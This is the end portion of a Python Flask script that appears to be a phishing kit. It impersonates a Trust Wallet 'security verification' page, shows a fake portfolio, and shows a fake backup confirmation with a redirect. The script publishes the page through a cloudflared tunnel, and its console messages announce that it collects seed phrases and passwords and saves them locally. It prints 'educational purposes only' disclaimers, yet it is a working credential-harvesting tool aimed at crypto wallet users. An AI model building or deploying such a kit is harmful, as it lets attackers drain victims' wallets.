                    Security Hash: TW-VERIFY-<span id="security-hash">0000000</span>
                </div>
                
                <div class="backup-note">
                    🔒 Your encrypted backup has been created. Keep your recovery phrase safe and never share it.
                </div>
                
                <div class="redirect-notice">
                    ⏳ You will be redirected to your Trust Wallet dashboard in 8 seconds...
                </div>
                
                <button class="continue-btn" onclick="window.location.href='/'">
                    Access Wallet Dashboard
                </button>
            </div>
        </div>
        
        <script>
            // Generate random security hash
            document.getElementById('security-hash').textContent = 
                Math.random().toString(36).substring(2, 10).toUpperCase();
            
            // Animate status items
            setTimeout(() => {
                const statusItems = document.querySelectorAll('.status-item');
                statusItems.forEach((item, index) => {
                    item.style.opacity = '0';
                    item.style.transform = 'translateX(-15px)';
                    
                    setTimeout(() => {
                        item.style.transition = 'all 0.4s ease';
                        item.style.opacity = '1';
                        item.style.transform = 'translateX(0)';
                    }, index * 150);
                });
                
                // Animate asset updates
                const assetUpdates = document.querySelectorAll('.asset-update');
                assetUpdates.forEach((asset, index) => {
                    asset.style.opacity = '0';
                    setTimeout(() => {
                        asset.style.transition = 'opacity 0.4s';
                        asset.style.opacity = '1';
                    }, index * 150 + 450);
                });
            }, 400);
            
            // Mobile viewport height fix
            function setViewportHeight() {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', setViewportHeight);
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"💰 Trust Wallet Public Link: {tunnel_url}")
            print(f"🔐 Collecting: Seed Phrases & Passwords")
            print(f"💾 Save location: {BASE_FOLDER}")
            print(f"💰 Showing: $85,081 portfolio value")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real seed phrases!")
            print("⚠️  Seed phrases = Complete wallet access!")
            print("⚠️  Crypto wallets are prime targets for hackers!")
            print("⚠️  Real wallet thefts happen daily!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5014, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting Trust Wallet Security Verification Page...")
    print("📱 Port: 5014")
    print("💾 Save location: ~/storage/downloads/TrustWallet/")
    print("💰 Showing: $85,081 Portfolio (8.42 ETH, 0.42 BTC, 4,200 SOL)")
    print("🔐 Collecting: 12/18/24-word Seed Phrases + Passwords")
    print("🎯 Target: Crypto wallet users needing 'security verification'")
    print("🖼️  Features: Real Trust Wallet logo, Mobile responsive design")
    print("📱 Mobile: Optimized for iPhone/Android, touch-friendly")
    print("⚠️  WARNING: Seed phrase phishing is extremely dangerous!")
    print("⚠️  Losing seed phrase = Losing ALL crypto assets forever!")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5014")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)